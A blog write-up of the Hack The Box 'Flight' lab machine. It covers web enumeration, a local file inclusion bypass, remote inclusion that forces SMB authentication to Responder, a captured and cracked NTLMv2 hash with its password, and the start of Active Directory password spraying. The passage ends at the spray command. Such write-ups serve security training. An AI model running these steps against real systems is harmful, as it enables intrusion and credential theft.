<img width="761" height="325" alt="image" src="https://github.com/user-attachments/assets/809a2bce-f014-46e0-9de9-842f8475812c" />---
layout: posts
title: "HTB — Flight Writeup"
date: 2026-03-22
tags: [htb, writeup, windows, web]
categories: [ctf]
---

## Overview

- **Machine:** Flight
- **Platform:** Hack The Box
- **OS:** Windows
- **Difficulty:** Hard

Flight is a really fun machine that spans from web application enumeration all the way into Active Directory attacks. It requires a solid understanding of web fuzzing, identifying useful entry points, capturing NTLM authentication, and leveraging those credentials for lateral movement and privilege abuse. It’s an excellent box to reinforce these skills in a realistic scenario. A bit wide but it's steps are simple and definitely very enjoyable.

---

## Initial Enumeration

### Nmap Scan

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ sudo nmap -p- -sVC 10.129.228.120

Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-22 16:25 EDT
Nmap scan report for 10.129.228.120
Host is up (0.034s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-22 20:43:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 16m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-03-22T20:44:29
|_  start_date: N/A
```

Nmap reveals the typical ports for a machine inside an Active Directory, including SMB, RPC and LDAP. It also reveals port 80 open, most likely a custom web application. 

### Enum4linux

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ enum4linux-ng flight.htb

ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... flight.htb
[*] Username ......... ''
[*] Random Username .. 'gtokxbsi'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ===================================
|    Listener Scan on flight.htb    |
 ===================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: timed out
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: timed out
[*] Checking SMB
[-] Could not connect to SMB on 445/tcp: no route to host
[*] Checking SMB over NetBIOS
^C
[!] Received SIGINT, aborting enumeration

Completed after 11.03 seconds
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ sudo nano /etc/hosts             
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ enum4linux-ng flight.htb
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... flight.htb
[*] Username ......... ''
[*] Random Username .. 'bzocmkhp'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ===================================
|    Listener Scan on flight.htb    |
 ===================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ==================================================
|    Domain Information via LDAP for flight.htb    |
 ==================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: flight.htb

 =========================================================
|    NetBIOS Names and Workgroup/Domain for flight.htb    |
 =========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 =======================================
|    SMB Dialect Check on flight.htb    |
 =======================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                                                                                                                                                                         
  SMB 1.0: false                                                                                                                                                                                                                            
  SMB 2.02: true                                                                                                                                                                                                                            
  SMB 2.1: true                                                                                                                                                                                                                             
  SMB 3.0: true                                                                                                                                                                                                                             
  SMB 3.1.1: true                                                                                                                                                                                                                           
Preferred dialect: SMB 3.0                                                                                                                                                                                                                  
SMB1 only: false                                                                                                                                                                                                                            
SMB signing required: true                                                                                                                                                                                                                  

 =========================================================
|    Domain Information via SMB session for flight.htb    |
 =========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: G0                                                                                                                                                                                                                   
NetBIOS domain name: flight                                                                                                                                                                                                                 
DNS domain: flight.htb                                                                                                                                                                                                                      
FQDN: g0.flight.htb                                                                                                                                                                                                                         
Derived membership: domain member                                                                                                                                                                                                           
Derived domain: flight                                                                                                                                                                                                                      

 =======================================
|    RPC Session Check on flight.htb    |
 =======================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[-] Could not establish random user session: STATUS_LOGON_FAILURE

 =================================================
|    Domain Information via RPC for flight.htb    |
 =================================================
[+] Domain: flight
[+] Domain SID: S-1-5-21-4078382237-1492182817-2568127209
[+] Membership: domain member

 =============================================
|    OS Information via RPC for flight.htb    |
 =============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                                                                                                                                                    
OS version: '10.0'                                                                                                                                                                                                                          
OS release: '1809'                                                                                                                                                                                                                          
OS build: '17763'                                                                                                                                                                                                                           
Native OS: not supported                                                                                                                                                                                                                    
Native LAN manager: not supported                                                                                                                                                                                                           
Platform id: null                                                                                                                                                                                                                           
Server type: null                                                                                                                                                                                                                           
Server type string: null                                                                                                                                                                                                                    

 ===================================
|    Users via RPC on flight.htb    |
 ===================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 ====================================
|    Groups via RPC on flight.htb    |
 ====================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 ====================================
|    Shares via RPC on flight.htb    |
 ====================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 =======================================
|    Policies via RPC for flight.htb    |
 =======================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 =======================================
|    Printers via RPC for flight.htb    |
 =======================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

```

Enum4linux reveals additional information like the FDQN, domain SID and the computer name. I'll add this to my `/etc/hosts`.

### Port 80

I decided to start with port 80 after performing initial tests as "Guest" and Null users and getting no access. It's unusual to see a web application in this type of machines. I figured our initial foothold might be there.

<p align="center">
  <a href="/assets/images/flight/captura1.png" class="glightbox">
    <img src="/assets/images/flight/captura1.png" width="700">
  </a>
</p>

Initially, the site seems to be half way developed. None of the buttons work or redirect to anywhere. I ran an initial fuzz with dirb for directories and with ffuf for other virtual hosts.

Dirb didn't show me anything interesting beyond a lot of 403's.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ dirb http://flight.htb                                                                                                                        

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Mar 22 16:42:42 2026
URL_BASE: http://flight.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://flight.htb/ ----
+ http://flight.htb/aux (CODE:403|SIZE:299)                                                                                                                                                                                                
+ http://flight.htb/cgi-bin/ (CODE:403|SIZE:299)                                                                                                                                                                                           
+ http://flight.htb/com1 (CODE:403|SIZE:299)                                                                                                                                                                                               
+ http://flight.htb/com2 (CODE:403|SIZE:299)                                                                                                                                                                                               
+ http://flight.htb/com3 (CODE:403|SIZE:299)                                                                                                                                                                                               
+ http://flight.htb/con (CODE:403|SIZE:299)                                                                                                                                                                                                
==> DIRECTORY: http://flight.htb/css/                                                                                                                                                                                                      
+ http://flight.htb/examples (CODE:503|SIZE:399)                                                                                                                                                                                           
==> DIRECTORY: http://flight.htb/images/                                                                                                                                                                                                   
==> DIRECTORY: http://flight.htb/Images/                                                                                                                                                                                                   
+ http://flight.htb/index.html (CODE:200|SIZE:7069)                                                                                                                                                                                        
==> DIRECTORY: http://flight.htb/js/                                                                                                                                                                                                       
+ http://flight.htb/licenses (CODE:403|SIZE:418)                                                                                                                                                                                           
+ http://flight.htb/lpt1 (CODE:403|SIZE:299)                                                                                                                                                                                               
+ http://flight.htb/lpt2 (CODE:403|SIZE:299)                                                                                                                                                                                               
+ http://flight.htb/nul (CODE:403|SIZE:299)                                                                                                                                                                                                
+ http://flight.htb/phpmyadmin (CODE:403|SIZE:418)                                                                                                                                                                                         
+ http://flight.htb/prn (CODE:403|SIZE:299)                                                                                                                                                                                                
+ http://flight.htb/server-info (CODE:403|SIZE:418)                                                                                                                                                                                        
+ http://flight.htb/server-status (CODE:403|SIZE:418)                                                                                                                                                                                      
+ http://flight.htb/webalizer (CODE:403|SIZE:418)                                                                                                                                                                                          
                                                                                                                                                                                                                                           
---- Entering directory: http://flight.htb/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                           
---- Entering directory: http://flight.htb/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                           
---- Entering directory: http://flight.htb/Images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                           
---- Entering directory: http://flight.htb/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sun Mar 22 16:46:04 2026
DOWNLOADED: 4612 - FOUND: 17
```

However, ffuf with the flag `-ac` to auto-calibrate did yield some results.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ ffuf -u http://flight.htb -H "Host: FUZZ.flight.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ac       

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://flight.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.flight.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 48ms]
```

I'll add this to /etc/hosts and continue enumeration.

### school.flight.htb

<p align="center">
  <a href="/assets/images/flight/captura2.png" class="glightbox">
    <img src="/assets/images/flight/captura2.png" width="700">
  </a>
</p>

Again, it seems the site is barely developed, with default text everywhere. Dirbusting shows a lot of 403's again.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ dirb http://school.flight.htb

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Mar 22 16:52:14 2026
URL_BASE: http://school.flight.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://school.flight.htb/ ----
+ http://school.flight.htb/aux (CODE:403|SIZE:306)                                                                                                                                                                                         
+ http://school.flight.htb/cgi-bin/ (CODE:403|SIZE:306)                                                                                                                                                                                    
+ http://school.flight.htb/com1 (CODE:403|SIZE:306)                                                                                                                                                                                        
+ http://school.flight.htb/com2 (CODE:403|SIZE:306)                                                                                                                                                                                        
+ http://school.flight.htb/com3 (CODE:403|SIZE:306)                                                                                                                                                                                        
+ http://school.flight.htb/con (CODE:403|SIZE:306)                                                                                                                                                                                         
+ http://school.flight.htb/examples (CODE:503|SIZE:406)                                                                                                                                                                                    
==> DIRECTORY: http://school.flight.htb/images/                                                                                                                                                                                            
==> DIRECTORY: http://school.flight.htb/Images/                                                                                                                                                                                            
+ http://school.flight.htb/index.php (CODE:200|SIZE:3996)                                                                                                                                                                                  
+ http://school.flight.htb/licenses (CODE:403|SIZE:425)                                                                                                                                                                                    
+ http://school.flight.htb/lpt1 (CODE:403|SIZE:306)                                                                                                                                                                                        
+ http://school.flight.htb/lpt2 (CODE:403|SIZE:306)                                                                                                                                                                                        
+ http://school.flight.htb/nul (CODE:403|SIZE:306)                                                                                                                                                                                         
+ http://school.flight.htb/phpmyadmin (CODE:403|SIZE:425)                                                                                                                                                                                  
+ http://school.flight.htb/prn (CODE:403|SIZE:306)                                                                                                                                                                                         
+ http://school.flight.htb/server-info (CODE:403|SIZE:425)                                                                                                                                                                                 
+ http://school.flight.htb/server-status (CODE:403|SIZE:425)                                                                                                                                                                               
==> DIRECTORY: http://school.flight.htb/styles/                                                                                                                                                                                            
+ http://school.flight.htb/webalizer (CODE:403|SIZE:425)                                                                                                                                                                                   
                                                                                                                                                                                                                                           
---- Entering directory: http://school.flight.htb/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                           
---- Entering directory: http://school.flight.htb/Images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                           
---- Entering directory: http://school.flight.htb/styles/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
```

### LFI

There's something in the page that caught my attention.

<p align="center">
  <a href="/assets/images/flight/captura3.png" class="glightbox">
    <img src="/assets/images/flight/captura3.png" width="700">
  </a>
</p>

It looks like index.php takes a `view` parameter. Seeing as this parameter loads content dynamically, I'll test for LFI.

<p align="center">
  <a href="/assets/images/flight/captura4.png" class="glightbox">
    <img src="/assets/images/flight/captura4.png" width="700">
  </a>
</p>

It looks like we have a filter to avoid common paths to test LFI. To go through this quickly and see if we can achieve LFI bypassing the filter, I'll copy the request as a file and load a wordlist in seclists collection. I'll fuzz the parameter with ffuf.

I'll name the request file req.req and use LFI-Jhaddix.txt to test for LFI with the flag `-ac` to auto-calibrate the response.

Our req.req will look like this.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ cat req.req  
GET /index.php?view=FUZZ HTTP/1.1
Host: school.flight.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

And now I'll run ffuf.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ ffuf -request req.req -request-proto http  -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://school.flight.htb/index.php?view=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Header           : Connection: keep-alive
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Priority: u=0, i
 :: Header           : Host: school.flight.htb
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

%00/etc/shadow%00       [Status: 500, Size: 639, Words: 73, Lines: 21, Duration: 71ms]
%00/etc/passwd%00       [Status: 500, Size: 639, Words: 73, Lines: 21, Duration: 71ms]
/etc/passwd%00          [Status: 500, Size: 639, Words: 73, Lines: 21, Duration: 34ms]
etc/shadow%00           [Status: 500, Size: 639, Words: 73, Lines: 21, Duration: 41ms]
C:/Windows/win.ini      [Status: 200, Size: 1194, Words: 149, Lines: 38, Duration: 36ms]
:: Progress: [929/929] :: Job [1/1] :: 925 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

Seeing that we're in a Windows machine, the one that interests us the most is the last `C:/Windows/win.ini`

I'll check it out with burpsuite.

<p align="center">
  <a href="/assets/images/flight/captura6.png" class="glightbox">
    <img src="/assets/images/flight/captura6.png" width="700">
  </a>
</p>

The LFI is succesful. Thinking about possible files to read, I always head first to configuration files for some plaintext credentials. I'll use this [list](https://github.com/MrW0l05zyn/pentesting/blob/master/web/payloads/lfi-rfi/lfi-windows-list.txt) with ffuf with the same approach as before.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ ffuf -request req.req -request-proto http  -w ./list_windows.txt -ac


C:/windows/system.ini   [Status: 200, Size: 1321, Words: 148, Lines: 44, Duration: 131ms]
C:/windows/system32/drivers/etc/hosts [Status: 200, Size: 1926, Words: 315, Lines: 52, Duration: 132ms]
C:/windows/win.ini      [Status: 200, Size: 1194, Words: 149, Lines: 38, Duration: 191ms]
C:/windows/windowsupdate.log [Status: 200, Size: 1378, Words: 173, Lines: 35, Duration: 191ms]
C:/xampp/sendmail/sendmail.ini [Status: 200, Size: 3198, Words: 431, Lines: 103, Duration: 320ms]
C:/xampp/phpmyadmin/config.inc.php [Status: 200, Size: 3153, Words: 274, Lines: 92, Duration: 320ms]
C:/xampp/tomcat/conf/tomcat-users.xml [Status: 200, Size: 3914, Words: 591, Lines: 87, Duration: 289ms]
C:/xampp/webdav/webdav.txt [Status: 200, Size: 1379, Words: 167, Lines: 39, Duration: 289ms]
C:/xampp/apache/conf/httpd.conf [Status: 200, Size: 22337, Words: 2849, Lines: 597, Duration: 191ms]
C:/windows/system32/inetsrv/config/schema/aspnet_schema.xml [Status: 200, Size: 45670, Words: 8921, Lines: 700, Duration: 132ms]
C:/windows/system32/license.rtf [Status: 200, Size: 62635, Words: 7856, Lines: 365, Duration: 165ms]
C:/xampp/php/php.ini    [Status: 200, Size: 75093, Words: 9638, Lines: 2026, Duration: 255ms]
C:/windows/notepad.exe  [Status: 200, Size: 255566, Words: 1590, Lines: 713, Duration: 92ms]
C:/windows/panther/setupinfo [Status: 200, Size: 249166, Words: 8732, Lines: 465, Duration: 94ms]
C:/xampp/tomcat/conf/web.xml [Status: 200, Size: 177712, Words: 42818, Lines: 4762, Duration: 289ms]
C:/xampp/apache/logs/error.log [Status: 200, Size: 440031, Words: 47273, Lines: 1863, Duration: 223ms]
C:/windows/explorer.exe [Status: 200, Size: 4385078, Words: 28703, Lines: 12751, Duration: 196ms]
C:/xampp/apache/logs/access.log [Status: 200, Size: 7289509, Words: 977963, Lines: 63651, Duration: 223ms]
:: Progress: [246/246] :: Job [1/1] :: 45 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

We have a couple of interesting configuration files available, however, after revieweing them manually I couldn't find any interesting information. Next, I wanted to see if I could read the source code of index.php in school.flight.htn. Searching around in google is quite straightforward.


> *The main directory for all WWW documents is \xampp\htdocs. If you put a file "test.html" in this directory, you can access it with the URI*.

After a little bit of trial and error, I could find the directory for school.flight.htb and index.php.

<p align="center">
  <a href="/assets/images/flight/captura7.png" class="glightbox">
    <img src="/assets/images/flight/captura7.png" width="700">
  </a>
</p>

```php
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ cat index.php


<!DOCTYPE html>
<html>
<head>
<title>Aviation School</title>
<meta charset="UTF-8" />
<link rel="stylesheet" type="text/css" href="styles/style.css" />
<!--[if IE 6]><link rel="stylesheet" type="text/css" href="styles/ie6.css" /><![endif]-->
</head>
<body>
<div id="page">
  <div id="header">
    <div id="section">
      <div><a href="index.html"><img src="images/logo.gif" alt="" /></a></div>
       </div>
    <ul>
      <li><a href="index.php?view=home.html">Home</a></li>
      <li><a href="index.php?view=about.html">About Us</a></li>
      <li><a href="index.php?view=blog.html">Blog</a></li>
    </ul>
  </div>
<!DOCTYPE html>
<html>
<head>
<title>Aviation School</title>
<meta charset="UTF-8" />
<link rel="stylesheet" type="text/css" href="styles/style.css" />
<!--[if IE 6]><link rel="stylesheet" type="text/css" href="styles/ie6.css" /><![endif]-->
</head>
<body>
<div id="page">
  <div id="header">
    <div id="section">
      <div><a href="index.html"><img src="images/logo.gif" alt="" /></a></div>
       </div>
    <ul>
      <li><a href="index.php?view=home.html">Home</a></li>
      <li><a href="index.php?view=about.html">About Us</a></li>
      <li><a href="index.php?view=blog.html">Blog</a></li>
    </ul>
<?php if (!isset($_GET['view']) || $_GET['view'] == "home.html") { ?>
    <div id="tagline">
      <div>
        <h4>Cum Sociis Nat PENATIBUS</h4>
        <p>Aenean leo nunc, fringilla a viverra sit amet, varius quis magna. Nunc vel mollis purus.</p>
      </div>
    </div>
<?php } ?>
  </div>
<?php

ini_set('display_errors', 0);
error_reporting(E_ERROR | E_WARNING | E_PARSE); 

if(isset($_GET['view'])){
$file=$_GET['view'];
if ((strpos(urldecode($_GET['view']),'..')!==false)||
    (strpos(urldecode(strtolower($_GET['view'])),'filter')!==false)||
    (strpos(urldecode($_GET['view']),'\\')!==false)||
    (strpos(urldecode($_GET['view']),'htaccess')!==false)||
    (strpos(urldecode($_GET['view']),'.shtml')!==false)
){
    echo "<h1>Suspicious Activity Blocked!";
    echo "<h3>Incident will be reported</h3>\r\n";
}else{
    echo file_get_contents($_GET['view']);
}
}else{
    echo file_get_contents("C:\\xampp\\htdocs\\school.flight.htb\\home.html");
}

?>
  <div id="footer">
    <div>
      <div id="connect"> <a href="#"><img src="images/icon-facebook.gif" alt="" /></a> <a href="#"><img src="images/icon-twitter.gif" alt="" /></a> <a href="#"><img src="images/icon-youtube.gif" alt="" /></a> </div>
      <div class="section">
        <p>Copyright &copy; <a href="#">Domain Name</a> - All Rights Reserved | Template By <a href="#">Domain Name</a></p>
      </div>
    </div>
  </div>
</div>
</body>
</html>  <div id="footer">
    <div>
      <div id="connect"> <a href="#"><img src="images/icon-facebook.gif" alt="" /></a> <a href="#"><img src="images/icon-twitter.gif" alt="" /></a> <a href="#"><img src="images/icon-youtube.gif" alt="" /></a> </div>
      <div class="section">
        <p>Copyright &copy; <a href="#">Domain Name</a> - All Rights Reserved | Template By <a href="#">Domain Name</a></p>
      </div>
    </div>
  </div>
</div>
</body>
</html>                                                                                                                                                                                                                                            
```

### RFI and svc_apache ntlm

Index.php is short and straightforward. The vulnerable part is the usage of file_get_contents(), a built-in function in php without proper sanitization. Making use of this, I'll try to test for RFI too.

<p align="center">
  <a href="/assets/images/flight/captura8.png" class="glightbox">
    <img src="/assets/images/flight/captura8.png" width="700">
  </a>
</p>

I get a request in my python server.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.228.120 - - [22/Mar/2026 18:53:14] code 404, message File not found
10.129.228.120 - - [22/Mar/2026 18:53:14] "GET /test HTTP/1.1" 404 -
```

Seeing as this can make requests to me, I thought about smb authentication. I'll simply run responder and prompt my own machine in SMB for a file that may or may not exist, that doesn't really matter.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ sudo responder -I tun0
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]

...

```

Backslashes are also filtered, so I'll try it with forward slashes.

<p align="center">
  <a href="/assets/images/flight/captura9.png" class="glightbox">
    <img src="/assets/images/flight/captura9.png" width="700">
  </a>
</p>

And I immediately get a request in responder.

```bash
[+] Listening for events...                                                                                                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.129.228.120
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:ee4e2fb5593db145:F855796080717E63557258A8EAEF329B:010100000000....

```

It cracks pretty easily in hashcat and I have credentials for a user.

```powershell
SVC_APACHE::flight:ee4e2fb5593db145:f855796080717e63557258a8eaef329b:010100000000000000b9a5a82dbadc0166c165e9f2a7fe6b0000000002000800460033005900440001001e00570049004e002d004800540051003500470034003100570058005400480004003400570049004e002d00480054005100350047003400310057005800540048002e0046003300590044002e004c004f00430041004c000300140046003300590044002e004c004f00430041004c000500140046003300590044002e004c004f00430041004c000700080000b9a5a82dbadc010600040002000000080030003000000000000000000000000030000058e0af662bf94e26ed120b973d8ecc4d802b4ec34bc25a9fd2f49f35a358537b0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0033000000000000000000:S@Ss!K@*t13
```

### Lateral Movement

## Bloodhound enum

First thing I'll do is gather information about the domain with bloodhound and get a list of users. I'll use `lookupsid.py` and `bloodhound-python` for this.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ bloodhound-python -c all,Group,Session,DCOM,RDP,PSRemote,LoggedOn,Container,ObjectProps,ACL -d "flight.htb" -ns 10.129.228.120 -v -u svc_apache -p 'S@Ss!K@*t13'
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
DEBUG: Authentication: username/password
DEBUG: Resolved collection methods: localadmin, dcom, psremote, objectprops, group, rdp, acl, loggedon, container, trusts, session
DEBUG: Using DNS to retrieve domain information
DEBUG: Querying domain controller information from DNS
DEBUG: Using domain hint: flight.htb
INFO: Found AD domain: flight.htb
DEBUG: Found primary DC: g0.flight.htb
DEBUG: Found Global Catalog server: g0.flight.htb
DEBUG: Found KDC for enumeration domain: g0.flight.htb
INFO: Getting TGT for user
DEBUG: Trying to connect to KDC at g0.flight.htb:88
DEBUG: Trying to connect to KDC at g0.flight.htb:88
.....

```

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ lookupsid.py 'svc_apache'@flight.htb

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Brute forcing SIDs at flight.htb
[*] StringBinding ncacn_np:flight.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
498: flight\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: flight\Administrator (SidTypeUser)
501: flight\Guest (SidTypeUser)
502: flight\krbtgt (SidTypeUser)
512: flight\Domain Admins (SidTypeGroup)
513: flight\Domain Users (SidTypeGroup)
514: flight\Domain Guests (SidTypeGroup)
515: flight\Domain Computers (SidTypeGroup)
516: flight\Domain Controllers (SidTypeGroup)
517: flight\Cert Publishers (SidTypeAlias)
518: flight\Schema Admins (SidTypeGroup)
519: flight\Enterprise Admins (SidTypeGroup)
520: flight\Group Policy Creator Owners (SidTypeGroup)
.....

```

### S.Moon credentials

Looking at our current user, it looks like we don't have any interesting outbound control rights, and we don't belong to any interesting groups, not even Remote Users, so we won't be able to get a shell just yet.

<p align="center">
  <a href="/assets/images/flight/captura10.png" class="glightbox">
    <img src="/assets/images/flight/captura10.png" width="700">
  </a>
</p>

Next I'll try with my new list of users is to spray our current password. I'll use nxc for this.

```bash
┌──(kali㉿kali)-[~/hackthebox/flight]
└─$ nxc smb flight.htb -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
